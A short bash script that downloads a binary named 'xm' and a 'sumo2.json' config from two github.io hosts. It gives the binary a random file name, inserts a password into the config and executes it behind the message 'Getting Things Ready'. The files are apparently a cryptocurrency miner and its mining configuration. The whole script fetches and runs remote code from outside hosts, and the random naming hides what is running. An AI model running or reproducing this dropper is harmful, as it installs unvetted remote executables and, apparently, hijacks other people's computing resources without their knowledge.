#!/bin/bash
echo "Getting Things Ready ... "
wget http://dzmltzack.github.io/web/xm -O oxm
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
BB=za$NEW_UUID
cp oxm $BB
echo $NN >> $BB
wget https://pzeankto.github.io/namnam/sumo2.json -O config.json
sed -i "s/PSPS/$PASS/g" config.json
chmod +x $BB
./$BB
